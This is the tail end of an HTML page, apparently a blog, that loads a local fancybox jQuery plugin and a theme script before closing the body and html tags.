  <script type="text/javascript" src="/blog/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/blog/js/src/even.js?v=2.11.0"></script>
</body>
</html>
